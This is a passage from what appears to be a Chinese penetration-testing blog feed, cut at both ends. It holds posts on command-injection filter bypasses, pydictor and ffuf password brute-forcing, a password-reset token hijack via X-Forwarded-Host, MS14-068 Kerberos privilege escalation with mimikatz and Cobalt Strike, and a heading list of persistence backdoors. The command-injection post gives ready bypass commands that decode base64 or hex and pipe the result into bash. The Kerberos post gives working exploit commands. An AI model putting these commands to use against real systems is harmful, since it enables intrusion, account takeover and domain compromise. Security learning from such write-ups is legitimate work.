alt="图片"></p><ul><li>${IFS}绕过空格</li></ul><p>IFS是internal field separator的缩写，shell的特殊环境变量。shell根据IFS存储的值，可以是空格（040）、tab（011）、换行符（012）或者其他自定义符号，来解析输入和输出的变量值。这里echo -n是不进行自动换行</p><p><img src="/2022/10/28/bypass/640-20221028171628962.png" alt="图片"></p><p><img src="/2022/10/28/bypass/640-20221028171629014.png" alt="图片"></p><h4 id="2-6-利用base64绕过命令限制">2.6 利用base64绕过命令限制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo whoami|base64 //先输出whoami的base64编码</span><br><span class="line">`echo dwhvYW1pCg==|base64 -d` //将其base64解码</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171629024.png" alt="图片"></p><h4 id="2-7-hex编码绕过">2.7 hex编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># cat flag.php -&gt; 63617420666c61672e706870</span><br><span class="line">echo &quot;63617420666c61672e706870&quot;|xxd -r -p|bash</span><br><span class="line">#xxd: 二进制显示和处理文件工具,cat: 以文本方式ASCII显示文件#-r参数：逆向转换。将16进制字符串表示转为实际的数#-ps参数：以 postscript的连续16进制转储输出，也叫做纯16进制转储。#-r -p将纯十六进制转储的反向输出打印为了ASCII格式。</span><br><span class="line">cat flag.php -&gt; \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70#经测试，发现在php的ping环境上执行失败。在linux系统上执行成功$(printf &quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#123;printf,&quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;&#125;|bash`&#123;printf,&quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;&#125;`</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171629108.png" alt="图片"></p><h4 id="2-8-长度限制绕过">2.8 长度限制绕过</h4><ul><li>方法一：</li></ul><p>可以利用base64解码的方式将脚本写入多个文件合并后再执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;cat flag.txt&quot; | base64   </span><br><span class="line"># 首先生成所需命令的base64字符串</span><br><span class="line"># Y2F0IGZsYWcudHh0Cg==</span><br><span class="line">echo -n Y2F0IG &gt; a</span><br><span class="line">echo -n ZsYWcu &gt;b</span><br><span class="line">echo -n dHh0Cg== &gt; c</span><br><span class="line">下面合并文件</span><br><span class="line">cat b &gt;&gt; acat c &gt;&gt; a</span><br><span class="line">解码文件</span><br><span class="line">base64 -d a &gt; shell.sh</span><br><span class="line">sh shell.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171629068.png" alt="图片"></p><ul><li>方法二：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">首先通过命令创建带有命令分隔的文件</span><br><span class="line">&gt; &quot;txt&quot;</span><br><span class="line">&gt; &quot;ag.\\&quot;</span><br><span class="line">&gt; &quot;fl\\&quot;</span><br><span class="line">&gt; &quot;t \\&quot;</span><br><span class="line">&gt; &quot;ca\\&quot;</span><br><span class="line">在用ls -t输出到一个文件中，再利用sh执行ls -t &gt; shell2.sh</span><br><span class="line">#如果创建空文件时，创建了点.开头的文件，上边命令要添加-a选项将隐藏文件也写入qwzf，即</span><br><span class="line">ls -at &gt; shell2.sh</span><br><span class="line">sh shell2.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/10/28/bypass/640-20221028171629122.png" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 挖洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂七杂八</title>
      <link href="/2022/10/27/za/"/>
      <url>/2022/10/27/za/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-mov转mp4">0x01 mov转mp4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmpeg -i 1.mov -vcodec libx264 -preset fast -crf 20 -y -ab 128k 1.mp4</span><br></pre></td></tr></table></figure><h3 id="0x02-debain-安装go">0x02 debain 安装go</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/go/go1.17.6.linux-amd64.tar.gz</span><br><span class="line">tar -C /usr/local -xzf go1.17.6.linux-amd64.tar.gz</span><br><span class="line">echo export PATH=$PATH:/usr/local/go/bin &gt;&gt; ~/.profile #当前用户</span><br><span class="line">echo export PATH=$PATH:/root/go/bin &gt;&gt; ~/.profile</span><br><span class="line">source ~/.profile</span><br><span class="line">go version</span><br></pre></td></tr></table></figure><h3 id="0x03-安装谷歌浏览器">0x03  安装谷歌浏览器</h3><p>安装wegt</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install wget</span><br></pre></td></tr></table></figure><p>使用wegt下载最新的Google Chrome .deb程序包</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure><p>安装 Google Chrome</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install ./google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure><p>谷歌浏览器开启沙箱模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改/usr/share/applications/google-chrome.desktop文件</span><br><span class="line">Exec=/usr/bin/google-chrome-stable %U</span><br><span class="line">改为</span><br><span class="line">Exec=/usr/bin/google-chrome-stable --no-sandbox %U </span><br></pre></td></tr></table></figure><h3 id="0x04-Crawlergo-xray联动">0x04 Crawlergo+xray联动</h3><p>xray前期的配置</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chmod +x xray_linux_amd64   </span><br><span class="line">./xray_linux_amd64 version  //查看版本</span><br><span class="line">./xray_linux_amd64 genca    //生成证书</span><br><span class="line">cp ca.crt /usr/local/share/ca-certificates/xray.crt //安装证书</span><br><span class="line">update-ca-certificates</span><br></pre></td></tr></table></figure><p>下载<a href="https://github.com/timwhitez/crawlergo_x_XRAY">crawlergo+xray</a></p><p>配置好launcher.py的cmd变量中的crawlergo爬虫配置（主要是chrome路径转换本地路径）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/google-chrome</span><br></pre></td></tr></table></figure><p>下载<a href="https://github.com/0Kee-Team/crawlergo">crawlergo</a></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x crawlergo</span><br></pre></td></tr></table></figure><p>开始扫描</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一步：xray启动被动扫描状态</span><br><span class="line">./xray_linux_amd64 webscan --listen 127.0.0.1:7777 --html-output 1.html</span><br><span class="line">第二步：python3运行launcher.py</span><br><span class="line">//debain系统默认安装了python3,但是没有安装pip，这里需要手动安装</span><br><span class="line">apt-get install python3-pip</span><br><span class="line">//安装库</span><br><span class="line">pip3 install simplejson</span><br><span class="line">pip3 install requests</span><br></pre></td></tr></table></figure><h3 id="0x05-cenos安装java环境">0x05 cenos安装java环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先去官网下载jdk环境</span><br><span class="line">创建java目录：mkdir /usr/java</span><br><span class="line">把下载好的jdk解压好后，移动过去java目录</span><br><span class="line">设置环境变量：vi /etc/profile</span><br></pre></td></tr></table></figure><p>添加一下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#set java environment</span><br><span class="line">JAVA_HOME=/usr/java/jdk1.7.0_79</span><br><span class="line">JRE_HOME=/usr/java/jdk1.7.0_79/jre</span><br><span class="line">CLASS_PATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib</span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class="line">export JAVA_HOME JRE_HOME CLASS_PATH PATH</span><br></pre></td></tr></table></figure><p>让修改生效：source /etc/profile</p><h3 id="0x06-安装notify">0x06 安装notify</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go install -v github.com/projectdiscovery/notify/cmd/notify@latest</span><br><span class="line">默认配置文件在：$HOME/.config/notify/provider-config.yaml</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 杂七杂八 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限维持</title>
      <link href="/2022/10/27/Permission_dimension/"/>
      <url>/2022/10/27/Permission_dimension/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>未知攻，焉知防，作为一名合格的网络保安，肯定要学习攻防的知识。</p><p>一般在获取服务器权限之后，需要用一些后门来维持权限。如果你不想被管理员发现，请隐藏好它。</p><h2 id="windows权限维持">windows权限维持</h2><h3 id="0x01-隐藏文件">0x01 隐藏文件</h3><h4 id="利用文件属性">利用文件属性</h4><h4 id="利用ADS隐藏文件内容">利用ADS隐藏文件内容</h4><h4 id="驱动级文件隐藏">驱动级文件隐藏</h4><h3 id="0x02-隐藏账号">0x02 隐藏账号</h3><h3 id="0x03-端口复用">0x03 端口复用</h3><h3 id="0x04-进程注入">0x04 进程注入</h3><h3 id="0x05-注册表自启动">0x05 注册表自启动</h3><h3 id="0x06-组策略设置脚本启动">0x06 组策略设置脚本启动</h3><h3 id="0x07-计划任务">0x07 计划任务</h3><h3 id="0x08-服务自启动">0x08 服务自启动</h3><h3 id="0x09-WMI后门">0x09 WMI后门</h3><h3 id="0x10-dll-劫持">0x10 dll 劫持</h3><h3 id="0x11-com劫持">0x11 com劫持</h3><h3 id="0x12-映像劫持">0x12 映像劫持</h3><h2 id="linux权限维持">linux权限维持</h2><h3 id="0x01-隐藏文件-2">0x01 隐藏文件</h3><h3 id="0x02-隐藏文件时间戳">0x02 隐藏文件时间戳</h3><h3 id="0x03-隐藏权限">0x03 隐藏权限</h3><h3 id="0x04-隐藏历史操作命令">0x04 隐藏历史操作命令</h3><h3 id="0x05-隐藏远程SSH登陆记录">0x05 隐藏远程SSH登陆记录</h3><h3 id="0x06-端口复用">0x06 端口复用</h3><h3 id="0x07-进程隐藏">0x07 进程隐藏</h3><h3 id="0x08-一句话添加用户和密码">0x08 一句话添加用户和密码</h3><h3 id="0x09-SUID-Shell">0x09 SUID Shell</h3><h3 id="0x10-ssh公私钥免密登录">0x10 ssh公私钥免密登录</h3><h3 id="0x11-软连接">0x11 软连接</h3><h3 id="0x12-SSH-wrapper">0x12 SSH wrapper</h3><h3 id="0x13-strace后门">0x13 strace后门</h3><h3 id="0x14-crontab-反弹shell">0x14 crontab 反弹shell</h3><h3 id="0x15-openssh-后门">0x15 openssh 后门</h3><h3 id="0x16-PAM后门">0x16 PAM后门</h3><h3 id="0x17-rookit后门">0x17 rookit后门</h3>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pydictor 工具的妙用</title>
      <link href="/2022/10/26/pydictor/"/>
      <url>/2022/10/26/pydictor/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-前言">0x01 前言</h3><p>感觉这个工具还可以，在这里学习一下用法</p><h3 id="0x01-场景">0x01 场景</h3><h4 id="去除重复项">去除重复项</h4><p>面对合并后的超大字典，还是不舍得只要频率高的词，路径字典有时候还是多多益善。去重下，照单全收</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pydictor.py -tool uniqifer uniq.txt --output 1.txt</span><br></pre></td></tr></table></figure><p>或者直接合并加去重</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pydictor.py -tool uniqbiner /path --output uniq.txt</span><br></pre></td></tr></table></figure><h4 id="字典合并"><strong>字典合并</strong></h4><p>字典都不是凭空捏造或生成的，一般都会参考前辈们公布的字典。所以，先收集百八十个字典，放到一个目录下，把字典合并起来吧。</p><ol><li><p>合并目录/网站路径爆破字典</p></li><li><p>合并子域名字典</p></li><li><p>合并用户名字典</p></li><li><p>合并弱密码字典</p></li><li><p>其它各式各样的字典</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pydictor.py -tool combiner /my/dict/dirpath -o comb.txt</span><br></pre></td></tr></table></figure><h4 id="词频统计"><strong>词频统计</strong></h4><p>但是有时候我们通常不需要那么大的字典，选合并后字典的出现频率最高的前1000条保存吧。筛选出最常用的网站路径/子域名/用户名/弱密码/…</p><p>修改 <code>lib/data/data.py</code> 中 counter_split 变量指定的分隔符 ( 默认 “\n” )，也可以统计其它字符分隔的字典词频.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pydictor.py -tool counter vs 222.txt 100</span><br></pre></td></tr></table></figure><h4 id="枚举数字字典"><strong>枚举数字字典</strong></h4><p>准备好字典了，拿最基础的试试手</p><p>1.爆破 4 位或 6 位数字手机短信验证码</p><p>2.爆破用户名ID值</p><p>生成 4 位纯数字字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pydictor.py -base d --len 4 4</span><br></pre></td></tr></table></figure><h4 id="简单用户名字典"><strong>简单用户名字典</strong></h4><p>不能确定是否存在某用户时，试试 1 位到 3 位的拼音字典，加上 123456 这样的几个弱口令，说不定就有意外收获：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pydictor.py -base L --len 1 3 -o dict.txt</span><br></pre></td></tr></table></figure><h4 id="后台管理员密码字典（明文传输）"><strong>后台管理员密码字典</strong>（明文传输）</h4><p>经常遇到的测试场景了，就是一个登录页，把收集到的信息都用上，生成后台爆破字典，比如</p><p>域名: <a href="http://test.land.com.cn">test.land.com.cn</a></p><p>编辑名: 张美丽、Adaor、midato</p><p>公司名: 上海美丽大米有限责任公司(如有雷同纯属巧合)</p><p>座机: 568456</p><p>地址: xxx 园区 A 座 312 室</p><p>把自己常用的弱口令字典复制到 <code>wordlist/Web</code> 目录下，最终生成的字典会包含它们；</p><p>然后把下列信息写入 <code>/data.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line">land</span><br><span class="line">zhangmeili</span><br><span class="line">meili</span><br><span class="line">zml</span><br><span class="line">Adaor</span><br><span class="line">midato</span><br><span class="line">meilidami</span><br><span class="line">mldm</span><br><span class="line">shmldm</span><br><span class="line">568456</span><br><span class="line">A312</span><br></pre></td></tr></table></figure><p>生成字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pydictor.py -extend /data.txt --level 3 --len 4 16</span><br></pre></td></tr></table></figure><h4 id="后台管理员密码字典-前台普通加密"><strong>后台管理员密码字典(前台普通加密)</strong></h4><p>有时候网站的密码可能不是直接明文传输过去的，程序员会用 js 简单加密下再传输过去，比如 base64 编码、md5 加密，这时候可以用 --encode 参数生成加密字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pydictor.py -extend /data.txt --level 3 --len 4 16 --encode b64</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pydictor.py -extend /data.txt --level 3 --len 4 16 --encode md5</span><br></pre></td></tr></table></figure><h4 id="后台管理员密码字典-前台js自定义加密"><strong>后台管理员密码字典(前台js自定义加密)</strong></h4><p>高级点的程序员，还喜欢前端自定义个 js 加密方法，把用户名和密码加密后传输过去，比如</p><img src="/2022/10/26/pydictor/image-20221026163024621.png" alt="image-20221026163024621" style="zoom:50%;"><p>这时候，普通爆破工具基本都无能为力了，但是却依旧可以通过 pydictor 来生成字典；</p><p>修改 <code>/lib/fun/encode.py</code> 文件的 test_encode() 函数，用 python 语法仿照上图的加密方式再实现一遍加密：</p><img src="/2022/10/26/pydictor/image-20221026163057744.png" alt="image-20221026163057744" style="zoom:50%;"><p>然后运行命令，生成按照前端js加密方法加密后的密码字典，可以直接用burpsuite加载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pydictor.py -extend /data.txt --level 3 --len 4 16 --encode test</span><br></pre></td></tr></table></figure><p>需要注意的是，一般生成加密字典前要生成一个没加密的字典，因为每一项在文件中的顺序是一致的，所以爆破出来密码后，可以通过行数对照去没加密的字典中查找明文。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂七杂八 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ffuf用法</title>
      <link href="/2022/10/26/ffuf/"/>
      <url>/2022/10/26/ffuf/</url>
      
        <content type="html"><![CDATA[<h3 id="用法">用法</h3><ul><li><p>-u  指定url</p></li><li><p>-w     设置字典</p></li><li><p>-c      将响应状态码用颜色区分，windows下无法实现该效果。</p></li><li><p>-t        线程率，默认40</p></li><li><p>-p       请求延时： 0.1、0.2s</p></li><li><p>-ac      自动校准fuzz结果</p></li><li><p>-H        Header头，格式为 “Name: Value”</p></li><li><p>-X         HTTP method to use</p></li><li><p>-d         POST data</p></li><li><p>-r         跟随重定向</p></li><li><p>-recursion num     递归扫描</p></li><li><p>-x       设置代理 http 或 socks5://127.0.0.1:8080</p></li><li><p>-s     不打印附加信息，简洁输出</p></li><li><p>-e      设置脚本语言 -e .asp,.php,.html,.txt等</p></li><li><p>-o     输出文本</p></li><li><p>-of  输出格式文件，支持html、json、md、csv、或者all</p><p><strong>匹配输出</strong></p></li><li><p>-mc ：指定状态代码。</p></li><li><p>-ml：指定响应行数</p></li><li><p>-mr: 指定正则表达式模式</p></li><li><p>-ms：指定响应大小</p></li><li><p>-mw：指定响应字数</p><p><strong>过滤输出</strong></p></li><li><p>-fw : 按字数过滤</p></li><li><p>-fl ：按行数过滤</p></li><li><p>-fs ：按响应大小过滤</p></li><li><p>-fc : 按状态码过滤</p></li><li><p>-fr : 按正则表达式模式过滤</p></li></ul><p>​<strong>子域名爆破</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w subdomains.txt -u http://website.com/ -H &quot;Host:FUZZ.website.com&quot;</span><br></pre></td></tr></table></figure><p>​<strong>不输出200，300状态码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w dict -u http://website.com/FUZZ -e .asp,.php,.jsp -fc 200,300</span><br></pre></td></tr></table></figure><p>​<strong>密码爆破&amp;接口&amp;参数模糊测试</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w wordlist.list -X POST -d &quot;username=admin\&amp;password=FUZZ&quot; -u http://website.com/FUZZ</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 杂七杂八 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过X-Forwarded-Host密码重置令牌泄露</title>
      <link href="/2022/10/26/Bounty1/"/>
      <url>/2022/10/26/Bounty1/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-前言">0x01 前言</h3><p>看到国外老哥挖洞思路挺骚的，这里记录一下。<a href="https://infosecwriteups.com/password-reset-token-leak-via-x-forwarded-host-4ed3e33dca31">原文连接</a></p><h3 id="0x02-详情">0x02 详情</h3><p>在某个网站上，发现密码重置功能</p><img src="/2022/10/26/Bounty1/image-20221026095909492.png" alt="image-20221026095909492" style="zoom:30%;"><p>通过抓包分析</p><img src="/2022/10/26/Bounty1/image-20221026100005603.png" alt="image-20221026100005603" style="zoom:50%;"><p>每当输入电子邮件并单击重置密码时，我们都会收到一封带有密码重置令牌链接更改密码的电子邮件</p><p>拦截密码重置请求，小哥也启动了ngrok服务器</p><p>原始请求中用ngrok服务器域添加了另一个标头“X-Forwarded-Host”</p><img src="/2022/10/26/Bounty1/image-20221026100143927.png" alt="image-20221026100143927" style="zoom:50%;"><p>这次收到了一封更改密码的电子邮件，并且使用ngrok服务器域名。密码重置令牌链接如下所示：</p><blockquote><p><a href="https://95saf4ct71g.ngrok.io/action-token?key=wia2lkIiA6ICciOiJIUzI1NiIsInR5cCIgODU2ZeyJhbGiA">https://95saf4ct71g.ngrok.io/action-token?key=wia2lkIiA6ICciOiJIUzI1NiIsInR5cCIgODU2ZeyJhbGiA</a></p></blockquote><p>可以看到，只需在密码重置请求中添加标题“X-Forwarded-Host”，即可成功更改host</p><p>然后小哥注意到，如果在密码重置页面中输入受害者的电子邮件，并拦截该请求，如果我请求包中添加“X-Forwarded-Host”为恶意的域名。然后，受害者将收到一封带有我的恶意域的密码重置令牌链接的电子邮件。当受害者点击该链接时，他将重定向到我的网站，他的所有令牌都会泄露给我。然后，我可以使用受害者泄露的令牌更改他的密码。是的，这个漏洞的影响是完全的帐户接管。</p><h3 id="0x03-实现">0x03 实现</h3><p>在服务器上安装nginx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install nginx -y</span><br><span class="line">systemctl status nginx</span><br></pre></td></tr></table></figure><img src="/2022/10/26/Bounty1/image-20221026102257856.png" alt="image-20221026102257856" style="zoom:50%;"><p>Nginx配置文件存储在<code>/etc/nginx</code>目录中。</p><p>主要的Nginx配置文件为<code>/etc/nginx/nginx.conf</code></p><p>访问日志在：<code>/var/log/nginx/access.log</code></p><img src="/2022/10/26/Bounty1/image-20221026102957878.png" alt="image-20221026102957878" style="zoom:50%;"><p>通过nginx的访问日志，获取重置密码的令牌</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 挖洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos 域用户提权漏洞</title>
      <link href="/2022/10/25/Domain_User_Privilege_Escalation/"/>
      <url>/2022/10/25/Domain_User_Privilege_Escalation/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 攻击者 将任意用户权限提升至域管级别。</p><p>14-068 产生的原因主要在于用户在向KDC申请TGT时，可以伪造自己的Kerberos票据。如果票据声明自己有域管理员权限，而KDC在处理票据时未验证票据的签名，那么，返给用户的TGT就使普通域用户拥有了域管理员权限。该用户可以将TGT发送到KDC，KDC的TGS在验证TGT后，将ST发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。</p><h3 id="0x01-PyKEK">0x01 PyKEK</h3><p>PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，<a href="https://github.com/mubix/pykek">下载地址</a></p><p>使用 PyKEK 可以生成一个高权限的服务票据，并通过 mimikatz 将服务票据导入到内存中。</p><p>MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况，未发现其补丁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get hotfixid | findstr KB3011780</span><br></pre></td></tr></table></figure><p>查看当前用户的SID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025193542155.png" alt="image-20221025193542155" style="zoom:50%;"><p>生成高权限票据，-d 指定域控地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 ms14-068.py -u 域成员名@域名 -s 域成员sid -d 域控ip -p 域成员密码</span><br><span class="line"></span><br><span class="line">MS14-068.exe -u user1@fzm.cn -s S-1-5-21-804046751-2176370659-833378800-1104 -d 10.1.10.8 -p 1qaz@WSX</span><br></pre></td></tr></table></figure><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025154101164.png" alt="image-20221025154101164" style="zoom:50%;"><p>打开 mimikatz 清除当前内存中的票据信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025183715533.png" alt="image-20221025183715533" style="zoom:50%;"><p>将高权限票据注入内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc TGT_user1@fzm.cn.ccache</span><br></pre></td></tr></table></figure><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025183747863.png" alt="image-20221025183747863" style="zoom:50%;"><p>查看当前凭证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list     </span><br></pre></td></tr></table></figure><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025183819573.png" alt="image-20221025183819573" style="zoom:50%;"><p>在这里使用windows server 2012和windows server 2012 r2当域控后，验证不成功。</p><p>而windows server 2008r2可以成功。</p><p>可以使用 net use 连接域控后，再使用 psexec 获取 Shell</p><blockquote><p>这里 net use 使用 IP 可能会失败，因此在此使用机器名进行连接</p></blockquote><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025165502646.png" alt="image-20221025165502646" style="zoom:50%;"><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025165317925.png" alt="image-20221025165317925" style="zoom:50%;"><h3 id="0x02-cobaltstrike">0x02 cobaltstrike</h3><p>使用ms14-068.exe生成一个票据文件。</p><p><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025154101164.png" alt="image-20221025154101164" style="zoom:50%;">然后使用 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Frvazarkar%2FKrbCredExport">KrbCredExport</a>将 .ccache文件转化为kirbi格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python KrbCredExport.py TGT_user1@fzm.cn.ccache user.ticket</span><br></pre></td></tr></table></figure><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025184104076.png" alt="image-20221025184104076" style="zoom:50%;"><p>在cs的beacon中执行命令，选择ticket文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use</span><br></pre></td></tr></table></figure><p>成功获得域控权限。</p><img src="/2022/10/25/Domain_User_Privilege_Escalation/image-20221025171949577.png" alt="image-20221025171949577" style="zoom:50%;"><h4 id="域控上线cs">域控上线cs</h4><ul><li>方法1</li></ul><p>域控是不出网的，在内网找台出网的机器监听作为中转</p><img 